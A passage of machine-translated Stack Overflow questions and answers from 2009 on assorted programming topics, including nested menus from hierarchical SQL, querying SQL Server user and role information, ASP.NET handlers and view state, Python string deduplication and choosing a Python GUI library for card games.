            Page parentPage = topPage.FindPage(parentID);
            if(parentPage != null)
            {
                parentPage.Pages.Add(page);
                break;
            }
        }
    }
}

//render to page
public override void Render(HtmlTextWriter writer)
{
    writer.WriteFullBeginTag("ul");
    foreach(Page child in topPages)
    {
        RenderPage(writer, child);
    }
    writer.WriteEndTag("ul");
}

private void RenderPage(HtmlTextWriter writer, Page page)
{
    writer.WriteFullBeginTag("li");
    writer.WriteBeginTag("a");
    writer.WriteAttribute("href", "url");
    writer.Write(HtmlTextWriter.TagRightChar);
    writer.Write(page.Title);
    writer.WriteEndTag("a");
    if(page.Pages.Count > 0)
    {
        writer.WriteFullBeginTag("ul");
        foreach(Page child in page.Pages)
        {
            RenderPage(writer, child);
        }
        writer.WriteEndTag("ul");
    }
    writer.WriteEndTag("li");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-12T01:21:42.003

这应该让你开始。

```
with x (pageID, title)
      as (
  select cast(title as varchar(100)),pageID
    from pages
   where parentID is null
   union all
  select cast(x.title||' - '||e.title as varchar(100)),
         e.pageID
    from pages e, x
   where e.parentID = x.pageID
  )
  select title as title_tree
    from x
   order by 1 
```

输出：

```
TITLE_TREE
Home
Products
Services
Products - Category 1 
Products - Category 2
Products - Category 2 - Subcategory 1 
Products - Category 2 - Subcategory 1 - Third Level Category 1
Products - Category 2 - Subcategory 2 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-12T03:33:12.530

您是否考虑过使用 SELECT ... FOR XML EXPLICIT 从 SQL Server 获取 XML 输出？您的数据似乎为此完美设置。

例如：

[http://www.eggheadcafe.com/articles/20030804.asp](http://www.eggheadcafe.com/articles/20030804.asp)

如果你想追求，我可以举个例子。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-04-08T10:29:03.807

**RexM** - 首先我必须声明我是一名前端开发人员，所以甚至无法接触到你的 C# 编码技能和知识。但是 - 我确实使用 Page 对象实现了您的解决方案并遇到了问题。是的，对不起，在这种情况下，我是“pleaseSendMeTheCode”的水蛭，但无论如何，我认为详细说明“错误”很重要。

我正在构建一个使用嵌套 UL 来显示菜单项并允许用户根据需要重新排序菜单的站点。

我的菜单有以下数据字段：pageID、parentID、pageOrder、pageTitle

页面顺序是指页面在节点中出现的顺序。

所以我的查询`SelectAllDataFromTable_OrderedByParentIDAscending();`是：

```
SELECT * FROM [pages] ORDER BY [parentID] ASC, [pageOrder] ASC 
```

然后我使用 jsTree 使菜单项可拖放。

我重新订购了几页并发现了一个错误：

说我的结构是这样的：

```
home
  cars
    usa
      muscle cars
      suvs
    europe
  colours
  directions
    vertical
    horizontal
      up
      down 
```

如果我将“汽车”（以及所有它的孩子）移到“下”内，“汽车”的孩子将不再显示在菜单中。这就是“错误”。

我已经检查了“汽车”下的 db 和**parentID**和**pageOrder**都正确，我还尝试更改我的 SQL 查询，从头开始，直接在数据库上进行各种测试（以上所有都关闭了 jsTree，所以我可以看到基本的嵌套 UL）——但没有成功。

只是想知道，正如我已经看到其他论坛指向此页面以寻求将分层 sql 数据转换为嵌套 UL 的解决方案，这可能值得有人研究它。

由于我的整个网站都基于使用 Javascript，我现在已经实现了一个 Jquery.ajax 解决方案（在[我的网站](http://sites.google.com/site/fernandothecodemonkey/home/nested-ul-from-adjecent-hierarchical-sql-query)上的评论非常糟糕）来构建嵌套的 UL，但正如我所说，只是将其标记为潜在问题。

非常感谢我自己寻找解决方案的开始！

# sql-server - SQLServer (2000 & 2005) 查询安全/角色信息

> ID：636947
> 
> 赞同：1
> 
> 时间：2009-03-12T00:33:19.560
> 
> 标签：sql-server, security

我需要一个查询来显示有关 SQLServer 2000 和 SQLServer 2005 数据库中的用户、角色和权限的信息？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-12T00:46:14.320

登录信息在这里：

**SQL Server 2000：** 从 master.dbo.syslogins 中选择 *

**SQL Server 2005：** 从 master.sys.logins 中选择 *

用户（每个当前数据库）：

**SQL Server 2000：** 从 dbo.sysusers 中选择 *

**SQL Server 2005：** 从 sys.users 中选择 *

来自[在线书籍](http://msdn.microsoft.com/en-us/library/ms345522.aspx#_FAQ2)：

> **如何找到指定架构中包含的实体的所有所有者？**[在运行以下查询之前，请将`<database_name>`和 替换`<schema_name>`为有效名称]。

```
USE <database_name>;
GO
SELECT 'OBJECT' AS entity_type
    ,USER_NAME(OBJECTPROPERTY(object_id, 'OwnerId')) AS owner_name
    ,name 
FROM sys.objects WHERE SCHEMA_NAME(schema_id) = '<schema_name>'
UNION 
SELECT 'TYPE' AS entity_type
    ,USER_NAME(TYPEPROPERTY(SCHEMA_NAME(schema_id) + '.' + name, 'OwnerId')) AS owner_name
    ,name 
FROM sys.types WHERE SCHEMA_NAME(schema_id) = '<schema_name>' 
UNION
SELECT 'XML SCHEMA COLLECTION' AS entity_type 
    ,COALESCE(USER_NAME(xsc.principal_id),USER_NAME(s.principal_id)) AS owner_name
    ,xsc.name 
FROM sys.xml_schema_collections AS xsc JOIN sys.schemas AS s
    ON s.schema_id = xsc.schema_id
WHERE s.name = '<schema_name>';
GO 
```

# asp.net - AJAX 不适用于 ASP.NET HTTP 处理程序

> ID：636950
> 
> 赞同：0
> 
> 时间：2009-03-12T00:34:01.977
> 
> 标签：asp.net, jquery, httphandler

我想我在做一些愚蠢的事情。我发誓我以前做过这个没有问题，但现在我无法让它工作。我有一个用 ASP.NET 编写的 HTTP 处理程序，我想通过 AJAX（使用 jQuery）调用它。在我的 web.config 中，我像这样注册处理程序......

```
 <httpHandlers>
     <add verb="GET" path="~/getPage.axd" type="Handlers.GetPage"/>
 </httpHandlers> 
```

处理程序只是设置为现在进行测试...

```
Namespace Handlers

Public Class GetPage
    Implements IHttpHandler

    Public Sub ProcessRequest(ByVal context As System.Web.HttpContext) Implements System.Web.IHttpHandler.ProcessRequest
        With context.Response
            .Clear()
            .Write("ID: " & context.Request.QueryString("id"))
            .End()
        End With
    End Sub

    Public ReadOnly Property IsReusable() As Boolean Implements System.Web.IHttpHandler.IsReusable
        Get
            Return False
        End Get
    End Property
End Class
End Namespace 
```

我有以下 jQuery 来调用它...

```
$.get('http://localhost:81/getPage.axd?id=0', function(data) {
  alert(data);
}); 
```

我知道用于发出请求的 URL 是正确的。IIS 设置为将 axd 路径路由到 ASP.NET ISAPI 过滤器。我已经验证我的处理程序*没有*被调用（我将处理程序更改为打印日志消息并且没有打印任何内容。事件查看器没有显示任何内容）。

有任何想法吗？

**编辑：** 当我尝试直接导航到浏览器中的处理程序时，我收到 404 错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-12T00:45:39.483

知道了。我在 web.config 中的路径错误

```
<httpHandlers>
  <add verb="GET" path="getPage.axd" type="Handlers.GetPage"/>
</httpHandlers> 
```

# asp.net-mvc - 在 ASP.NET MVC 的局部视图中使用值类型作为模型

> ID：636954
> 
> 赞同：0
> 
> 时间：2009-03-12T00:34:57.573
> 
> 标签：asp.net-mvc, value-type

有没有办法使用这样的东西：`System.Web.Mvc.ViewUserControl<DateTime>`？我得到一个异常，该类型是值类型，而不是引用类型。解决此问题的正确方法是什么？谢谢。

**编辑**

我想要完成的是拥有一个控件`DateTime`来呈现日历。我想`DateTime`使用 MVC 的“点表示法”从我的 ViewData 中传递。

**编辑 2**

我听说/看到一些 MvcContrib 项目可能具有此功能，但我似乎无法再次找到它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-12T00:52:20.530

没有办法解决这个问题 - 只有解决方法。您不能将值类型作为 TModel 包含在 ViewUserControl 中，因为 TModel 具有成为引用类型的约束。

简单的解决方法是将您的值类型包装在一个类中作为您的模型。

```
class MyModel {
  public DateTime? DateTime {get;set;}
} 
```

通过定义您自己的类（如上面的 MyModel），您现在可以将 DateTime 传递给您的视图，如下所示

```
ActionResult MyActionMethod() {
  var db = new MyDataContext();
  var dbThing = db.Things.Where(t=> t.DateTimeProperty>=DateTime.Now).First();
  return View("myView", new MyModel{DateTime = dbThing.DateTimeProperty});
} 
```

您的视图当然需要将 MyModel 定义为模型类型，就像这样

```
public partial class MyView:ViewUserControl<MyModel> {
 //snip
} 
```

在您的视图中，只需参考 DateTime 属性即可访问 DateTime。

```
<%=Model.DateTime%> 
```

# php - require '/home/../http/' 和 require '/http/' 一样快吗？

> ID：636959
> 
> 赞同：0
> 
> 时间：2009-03-12T00:38:39.093
> 
> 标签：php, path, include, relative-path, absolute-path

我知道在 php.ini 中包含文件时使用相对路径的性能很差。但是，对于所有路径或仅相对于假定（上下文）包含路径的路径来说都是如此吗？

这条线是

```
require '/home/../http/test.php' 
```

和这条线一样快

```
require '/http/test.php' 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-12T00:41:36.513

无论哪种方式，一个有组织的结构都远远超过了解析较长字符串所花费的小代价。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-12T00:41:07.047

基本上是的。这些路径基本上首先由 php/apache 解析，然后由操作系统解析。

# c++ - ATL 简单对象向导 - “对象 Xxx 已存在”错误

> ID：636975
> 
> 赞同：5
> 
> 时间：2009-03-12T00:46:54.957
> 
> 标签：c++, visual-studio, com, visual-studio-2005, atl

我正在尝试使用Visual Studio 2005 中的**ATL 简单对象向导在我的 DLL 中创建一个新的 COM 对象。**

我输入对象的短名称，并派生所有其他字段。

但是，当我在向导中单击*下一步*时，出现以下错误消息：

```
Object 'IXxxInterfaceName' already exists 
```

我在整个解决方案中搜索了对 IXxxInterfaceName 的所有引用，但在任何地方都看不到它的定义。

向导如何确定它已经存在？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-08T06:13:42.773

我从来没有发现为什么向导确定对象名称已经存在 - 我猜某些东西被缓存在我无法追踪的地方。

最后，我在创建它时在接口名称的末尾附加了一个 2 以允许添加它。然后我用 IXxxInterfaceName 替换了所有出现的 IXxxInterfaceName2。在此之后一切正常。

如果我找到了这个问题的根本原因，我会更新答案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-12T00:56:35.823

它是否在您引用的库中定义？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-12-10T00:08:02.040

也发生在 VS 2008 中。但是，Clean solution 和 Clean project from build option 解决了这个问题:-)

# wpf - 调整 Silverlight 或 Flash 视频播放器的大小？

> ID：636976
> 
> 赞同：1
> 
> 时间：2009-03-12T00:48:22.487
> 
> 标签：wpf, silverlight, video, flash

是否可以即时调整silverlight/flash 视频播放器的大小？我想创建一个视频，我可以在其中拖动左下角来调整播放器的大小（保持纵横比），或者至少消除这样做的可能性，以便我可以继续使用其他方法。

提前致谢...

编辑：//忘了提抱歉忘了提，这也意味着实际视频本身调整大小对吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-12T00:52:49.467

**Flash：**是的，您可以通过 JavaScript 更改 Flash 对象的大小。使用 YUI、jQuery 或 Mootools JavaScript 库，制作原型应该不会太难。

[这里有一篇文章](http://www.dncompute.com/blog/2008/06/23/browsercanvas-the-worlds-easiest-way-to-dynamically-resize-flash.html)解释了如何在你的 flash 代码中调整 flash 的大小。

按比例调整大小 -[这是一个使用 jQuery 的示例](http://groups.google.com/group/jquery-ui/browse_thread/thread/c2e4008f8620a09f/5b6d56c1d4725300)。

我不确定 Silverlight 浏览器对象是否也是如此，但如果您不能这样做，我会感到惊讶。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-03-12T08:58:11.373

**Silverlight：** 当然。只需将 Stretch 属性设置为 Uniform，然后在调整大小时更改 Width 或 Height。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-02-24T05:26:47.010

[这是一个用于动态调整视频大小](http://www.tjkdesign.com/articles/how-to-resize-videos-on-the-fly.asp)的 CSS 解决方案。

如果使用 EM 进行样式设置，视频甚至可以根据用户设置自行调整大小。该演示展示了[视频如何根据用户代理的宽度调整自身大小](http://www.tjkdesign.com/articles/video-resizing/video.html)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-13T12:16:58.380

这是silverlight缩放的示例。这个[照片修饰和修复](http://www.retouchgenie.com)网站有几个silverlight控件，可以随着浏览器大小的调整而缩放。有一个相当不错的照片库，显示修饰前后的照片。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-03-29T23:34:40.103

**JWPlayer**

从 5.3 版开始，他们向 javascript API 添加了一个 resize() 方法，该方法允许您调整播放器的大小 - 所有控制栏等也将正确调整大小。

[http://www.longtailvideo.com/support/jw-player/jw-player-for-flash-v5/12540/javascript-api-reference](http://www.longtailvideo.com/support/jw-player/jw-player-for-flash-v5/12540/javascript-api-reference)

> resize(width, height) 将播放器的大小调整为指定的尺寸。
> 
> width:Number：播放器的新整体宽度。
> 
> height:Number：播放器的新整体高度。注意：如果视频旁边显示控制栏或播放列表，则实际视频当然小于整个播放器。

# python - 删除字符串中重复字符（单词）的最佳方法？

> ID：636977
> 
> 赞同：2
> 
> 时间：2009-03-12T00:48:24.407
> 
> 标签：python, string, duplicates

删除字符串中任何重复字符和由空格分隔的字符集的最佳方法是什么？

我认为这个例子更好地解释了它：

```
foo = 'h k k h2 h' 
```

应该变成：

```
foo = 'h k h2' # order not important 
```

其他示例：

```
foo = 's s k' 
```

变成：

```
foo = 's k' 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-03-12T00:58:06.070

```
' '.join(set(foo.split())) 
```

请注意，默认情况下 split() 将拆分所有空白字符。（例如制表符、换行符、空格）

因此，如果您只想在空间上拆分，则必须使用：

```
' '.join(set(foo.split(' '))) 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-03-12T00:49:59.567

你的意思是？

```
' '.join( set( someString.split() ) ) 
```

那是没有特定顺序的唯一以空格分隔的单词。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-03-12T00:57:24.027

```
out = []
for word in input.split():
    if not word in out:
        out.append(word)
output_string = " ".join(out) 
```

比使用一套更长，但它保持顺序。

**编辑：**没关系。我错过了关于订单不重要的问题。使用一套更好。

# python - 用于简单纸牌游戏的 wxPython 或 pygame？

> ID：636990
> 
> 赞同：6
> 
> 时间：2009-03-12T00:53:27.233
> 
> 标签：python, wxpython, pygame, playing-cards

我一直在玩用 Python 编写一些简单的纸牌游戏以获得乐趣，我想为游戏添加一个图形用户界面 (GUI)。你会推荐哪个库来为一个简单的纸牌游戏编写 GUI？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-12T01:06:26.000

如果你想要的只是一个 GUI，wxPython 应该可以解决问题。

如果您希望添加声音、控制器输入，并超越简单的纸牌游戏，那么您可能需要使用 pygame。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-12T09:30:17.913

我没有使用过 wxPython，但 Pygame 本身是相当低级的。它允许您捕捉按键、鼠标事件和在屏幕上绘制内容，但不提供任何预制的 GUI 控件。如果您使用 Pygame，您将不得不编写自己的 GUI 类或使用 Pygame 的现有 GUI 扩展，例如[Phil 的 Pygame Utilities](http://www.imitationpickles.org/pgu/wiki/index)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-12T19:09:36.790

通常，PyGame 是编码游戏的更好选择。但这适用于更常见的游戏类型——屏幕上的东西在移动，你必须有良好的“帧率”性能。

然而，对于纸牌游戏之类的东西，我会选择 wxPython（或者更确切地说，PyQt）。这是因为纸牌游戏在图形方面并不多（在屏幕上绘制 2D 纸牌形状在 wx/PyQt 中并不比在 PyGame 中更难）。另一方面，您可以从 wx 中获得很多好处——比如一个现成的用于交互的 GUI。

在 Pygame 中，您必须自己创建一个 GUI，或者通过几个半生不熟的库来为您完成它。这实际上对 Pygame 来说是有意义的，因为当您创建游戏时，您通常想要一个适合游戏风格的自己的 GUI。但是对于纸牌游戏，大多数情况下 wx 的标准 GUI 小部件都可以解决问题，并且可以为您节省数小时的编码时间。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-12T12:26:51.437

这个相关问题的答案可能对您非常有用：

[Pygame 能在图形方面做哪些 wxPython 做不到的事情？](https://stackoverflow.com/questions/343505/what-can-pygame-do-in-terms-of-graphics-that-wxpython-cant)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-12T01:00:17.793

我会说 pygame——我听说它很有趣，很简单，很快乐。此外，我所有使用 wxPython 的经历都令人悲伤和痛苦。

但我不是偏见或任何东西。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2010-08-23T17:49:38.240

pygame 是典型的选择，但 pyglet 在 PyCon 上得到了很多关注。这是关于 Python 游戏库的 wiki 条目：[http ://wiki.python.org/moin/PythonGameLibraries](http://wiki.python.org/moin/PythonGameLibraries)

# c# - 下拉绑定和回发 - ASP.NET

> ID：636992
> 
> 赞同：0
> 
> 时间：2009-03-12T00:54:48.197
> 
> 标签：c#, asp.net

我有一个相当复杂的页面。ASPX 页面加载一个用户控件，该控件又加载一个子用户控件。

家长控制

```
protected override void OnInit(EventArgs e)
{
  //Loads child control
} 
```

在子用户控件中，我使用继承自的自定义控件`System.Web.UI.HtmlControls.HtmlSelect`

澳交所：

```
<cust:CustDropDownList id="ctlDdl" runat="server"/> 
```

ASCX.CS

```
protected void Page_Load(object sender, EventArgs e)
{
  //Binds CtlDdl here 
} 
```

当用户单击“保存”按钮时，控件会动态重新加载用户控件，但会保留用户在下拉列表中选择的值。我在这里遇到了鸡和蛋的问题。

我想我只需要在它不是回发的情况下绑定 ctlDdl，但这会导致下拉列表没有被填充。

如果我每次都绑定它，那么我会失去用户的选择

**编辑：有人可以回复我对乔纳森回答的评论吗？谢谢**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-12T01:02:46.620

使用自定义控件，您必须管理状态。在传递状态的地方有一种冒泡效应。如果你不处理它，你就不会得到状态。

此链接将帮助您入门：[服务器控制自定义状态管理](http://msdn.microsoft.com/en-us/library/ms178650.aspx)

寻找

```
 Protected Overrides Sub LoadViewState( _
        ByVal savedState As Object)
        Dim p As Pair = TryCast(savedState, Pair)
        If p IsNot Nothing Then
            MyBase.LoadViewState(p.First)
            CType(Author, IStateManager).LoadViewState(p.Second)
            Return
        End If
        MyBase.LoadViewState(savedState)
    End Sub 
```

在[自定义属性状态管理示例](http://msdn.microsoft.com/en-us/library/ms178651.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-12T01:11:51.480

只需覆盖用户控件中的 OnInit 方法并从该方法加载自定义控件。ASP.NET 在 OnInit 之后和 PageLoad 之前设置视图状态跟踪。因此，加载控件时设置的默认值被视图状态引擎视为更改，并在回发时被重置。

**有关详细**说明，请参阅有关 viewstate 的这篇文章：

[http://weblogs.asp.net/infinitiesloop/archive/2006/08/03/truly-understanding-viewstate.aspx](http://weblogs.asp.net/infinitiesloop/archive/2006/08/03/truly-understanding-viewstate.aspx)

# c# - 设计问题：获取子对象类型信息，避免表示层中的 if 语句

> ID：636994
> 
> 赞同：1
> 
> 时间：2009-03-12T00:56:09.817
> 
> 标签：c#, asp.net, design-patterns, architecture, polymorphism

我有一个这样的客户层次结构：

```
abstract class Customer {
    public virtual string Name { get; set; }
}

class HighValueCustomer : Customer {
    public virtual int MaxSpending { get; set; }
} 

class SpecialCustomer : Customer {
    public virtual string Award { get; set; }
} 
```

当我检索客户时，我想在 Web 表单上显示要编辑/修改的属性。目前，我使用 if 语句来查找子客户类型并显示专门的属性。是否有设计模式（访问者？）或更好的方法，以便我可以避免表示层中的“if”语句？你怎么做呢？

更多信息：这是一个带有 nHibernate 后端的 asp.net 网站。每个客户类型在页面上都有自己的用户控件，我想根据客户类型自动加载。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-12T00:58:28.237

您可以使用反射来获取特定于子类（实例）的属性列表吗？（不易出错。）

如果没有，请创建一个返回特殊属性的（虚拟）方法。（更容易出错！）

以后者为例：

```
abstract class Customer {
    public virtual string Name { get; set; }

    public virtual IDictionary<string, object> GetProperties()
    {
        var ret = new Dictionary<string, object>();
        ret["Name"] = Name;
        return ret;
    }
}

class HighValueCustomer : Customer {
    public virtual int MaxSpending { get; set; }

    public override IDictionary<string, object> GetProperties()
    {
        var ret = base.GetProperties();
        ret["Max spending"] = MaxSpending;
        return ret;
    }
} 

class SpecialCustomer : Customer {
    public virtual string Award { get; set; }

    public override IDictionary<string, object> GetProperties()
    {
        var ret = base.GetProperties();
        ret["Award"] = Award;
        return ret;
    }
} 
```

无论如何，您可能想`fieldset`在您的网页上创建部分（s？），所以`if`会在那里发挥作用，使这种额外的编码有点烦人和无用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-12T03:53:30.327

我认为一个更干净的组织应该是具有显示控件或格式的并行层次结构。也许使用抽象工厂模式之类的东西同时创建 Customer 和 CustomerForm 的实例。显示返回的 CustomerForm 实例，它会知道额外的属性以及如何显示和编辑它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-12T09:08:23.690

新的：

```
interface CustomerEdit
{
    void Display();
} 
```

编辑：

```
abstract class Customer {
    protected CustomerEdit customerEdit; // customers have an object which allows for edit

    public virtual string Name { get; set; }
    public void Display() { customerEdit.Display(); } // allow the CustomerEdit implementor to display the UI elements
}

// Set customerEdit in constructor, tie with "this"
class HighValueCustomer : Customer {
    public virtual int MaxSpending { get; set; }
} 

// Set customerEdit in constructor, tie with "this"
class SpecialCustomer : Customer {
    public virtual string Award { get; set; }
} 
```

用法：

```
Customer whichCouldItBe = GetSomeCustomer();
whichCouldItBe.Display(); // shows UI depeneding on the concrete type 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-12T01:29:08.943

你有没有尝试过这样的事情：

```
public class Customer<T>
    where T : Customer<T>
{
    private T subClass;
    public IDictionary<string, object> GetProperties()
    {
        return subClass.GetProperties();
    }
} 
```

具有以下子类：

```
public class FinancialCustomer : Customer<FinancialCustomer>
{
} 
```

这不在我的脑海中，所以可能行不通。我在 CSLA.NET 中看到过这种类型的代码。[这是名为BusinessBase.cs](http://www.lhotka.net/cslacvs/viewvc.cgi/core/trunk/Source/Csla.core/BusinessBase.cs?revision=4463&view=markup)的 CSLA.NET 类的链接，它与我上面给出的定义相似。

# c++ - 纯虚拟类上的 DECLSPEC_NOVTABLE？

> ID：636999
> 
> 赞同：1
> 
> 时间：2009-03-12T00:58:19.407
> 
> 标签：c++, visual-c++, msdn, pure-virtual

这可能是习惯性的编程冗余。我注意到在标题中定义的一堆接口上的 DECLSPEC_NOVTABLE ( __declspec(novtable) )：

```
struct DECLSPEC_NOVTABLE IStuff : public IObject
{
    virtual method1 () = 0;
    virtual method2 () = 0;
}; 
```

关于这个 __declspec 扩展属性的[MSDN 文章](http://msdn.microsoft.com/en-us/library/k13k85ky(VS.71).aspx)说，添加这个人将删除构造和析构函数 vtable 条目，从而导致“显着减少代码大小”（因为 vtable 将被完全删除）。

这对我来说没有多大意义。这些家伙是纯虚拟的，为什么编译器不默认这样做呢？

这篇文章还说，如果你这样做，然后尝试实例化这些东西之一，你将遇到运行时访问冲突。但是当我用一些编译器（有或没有 __declspec 扩展名）尝试这个时，它们不会编译（正如我所预料的那样）。

所以我想总结一下：

*   对于纯虚拟接口，编译器是否会删除 vtable，或者我在这里错过了一些基本的东西？
*   MSDN 文章在说什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-12T01:11:29.953

编译器去掉了对 vtable 的**唯一引用**，这本来应该是在类的构造过程中。因此，链接器可以优化它，因为代码中不再有对它的引用。

顺便说一句，我养成了将空构造函数声明为 的习惯`protected`，并且还使用了 Microsoft 的 extension`abstract`关键字，以避免在运行时出现访问冲突。这样，编译器就会在编译时捕获问题（因为只有基类可以通过受保护的构造函数实例化接口）。派生类当然会在*其*构造过程中填充 vtable。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-12T09:02:07.293

对于愚蠢的编译器/链接器来说，这有点牵强。编译器不应插入对此 vtable 的任何引用，因为很明显不需要此 vtable。编译器还可以以链接器可以消除 vtable 的方式标记引用，但这当然更复杂。*`